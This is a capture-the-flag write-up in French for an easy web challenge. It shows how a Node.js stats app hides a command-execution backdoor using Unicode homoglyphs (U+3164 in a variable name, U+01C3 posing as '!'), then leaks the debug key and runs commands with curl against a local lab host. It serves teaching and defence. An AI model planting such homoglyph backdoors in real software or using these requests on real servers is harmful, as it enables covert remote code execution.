> Name: Posticum
> 
> Category:  Web
> 
> Difficulty: Easy
> 
> Description: 
> *Sharing is caring, but sometimes there are too many small projects that don't seem useful at first glance.*
> 
> *Posticum is a one of these projects created by a supposed sysadmin called Bakdyr. It appears suspicious... Can you look into it ?*

![preview_chall](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/31b43278-524d-4c0c-91b6-0e3be6e6f4f7)

Ce projet opensource permet d'afficher le résultat de certaines commandes telles que `vmstat` ou `mpstat`. Mais il y a aussi une fonctionnalité qui permet d'exécuter une commande arbitraire si on connait la valeur de `secret`.

```js
const secret = require('crypto').randomBytes(48).toString('hex')
//...
let { html , debugㅤ, cmd , cache } = req.query
// ...
if ( cmd && debugㅤ== secret )
	output += await exec(cmd).toString()
```

Si on se fie à la logique de ce code, il faudrait donc envoyer dans les paramètres de l'URL `debug` avec le bon secret et `cmd` avec la commande à exécuter. Sauf que secret semble difficilement devinable et bruteforçable.

En copiant le code de `app.js` dans un éditeur de texte moderne (sublime, vscode, etc), on remarque des choses étranges. 

![vscode](https://github.com/pun-private/writeup-barbhack2023-web/assets/27222105/1ac6fa2b-851a-428d-a691-4e80683b65bb)

Il y a des caractères qu'on pense être des espaces et des points d'exclamation qui ne le sont pas :
* `debugㅤ` : cette variable contient en réalité le caractère unicode `U+3164` (https://unicode-explorer.com/c/3164) qui ressemble à un espace
* `debugǃ=secret` : cette expression est équivalente à une assignation  `debugǃ = secret` car ce qui ressemble à un point d'exclamation est également un caractère unicode `U+01c3` (https://unicode-explorer.com/c/01c3)

Les techniques ci-dessus sont utilisées pour cacher une backdoor comme expliqué dans ce paper : https://certitude.consulting/blog/en/invisible-backdoor/

### Exploitation

Dans un premier temps, on peut faire fuiter le secret en faisant une requête avec la variable trompeuse `debug%E3%85%A4` (lignes 14, 17-19)

```bash
$> curl "127.0.0.1/systemstats?debug%E3%85%A4=1&html=1"

Incorrect debug key cf34db89032c6115e05a6a7c0205a5821245021426da5c833cffdd6120d5508a6f66bb99b698950476f1eeaafa3e78f9
```

Maintenant qu'on est en possession de la clé, on peut exécuter une commande arbitraire et récupérer le flag.

```bash
$> curl "http://127.0.0.1/systemstats?debug%E3%85%A4=<debug_key>&cmd=cat+flag.txt&html=1"

ALG{Homoglyph_Alternative_Backdoors}
```

### Bonus

Les indices qu'il y avait :
* Ρоѕτіϲυⅿ : ce mot contient des caractères unicode et en latin veut dire "la porte de derrière"

* bakdyr : backdoor en islandais

* `real sysadmins use nano to edit files` : on nous demande d'utiliser nano parce qu'on n'y voit pas les homoglyphes =)
